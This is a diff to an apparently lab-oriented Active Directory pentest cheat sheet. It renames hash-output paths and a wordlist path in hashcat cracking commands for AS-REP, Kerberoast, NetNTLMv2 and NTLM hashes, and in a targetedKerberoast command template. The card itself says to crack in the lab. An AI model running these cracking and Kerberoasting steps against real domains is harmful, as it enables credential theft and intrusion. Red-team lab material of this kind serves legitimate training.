@@ -16,14 +16,14 @@ Crack in the lab. Do not spray Entra / smart-lockout tenants with this card.
 ## Flags that matter
 
 ```
-hashcat -m 18200 /loot/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
-hashcat -m 13100 /loot/hashes/kerb.txt  /usr/share/wordlists/rockyou.txt
-hashcat -m 19700 /loot/hashes/kerb-aes.txt /usr/share/wordlists/rockyou.txt
-hashcat -m 5600  /loot/hashes/netntlmv2.txt /usr/share/wordlists/rockyou.txt
-hashcat -m 1000  /loot/hashes/ntlm.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 /logs/hashes/asrep.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 /logs/hashes/kerb.txt  /usr/share/wordlists/rockyou.txt
+hashcat -m 19700 /logs/hashes/kerb-aes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600  /logs/hashes/netntlmv2.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000  /logs/hashes/ntlm.txt /usr/share/wordlists/rockyou.txt
 
-# GOAD / known lab list first
-hashcat -m 18200 asrep.txt /opt/gotad/conf/wordlist-lab.txt
+# GOAD / known lab list first (ships as conf/wordlist-lab.txt.example)
+hashcat -m 18200 asrep.txt /opt/adtk/conf/wordlist-lab.txt.example
 
 # show
 hashcat -m 18200 asrep.txt --show --outfile-format 3
@@ -52,7 +52,7 @@ targetedKerberoast (only if BH says you can write a SPN):
 
 ```
 targetedKerberoast.py -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' --dc-ip {{DC}} \
-  -o /loot/hashes/targeted.txt
+  -o /logs/hashes/targeted.txt
 ```
 
 ## Read this
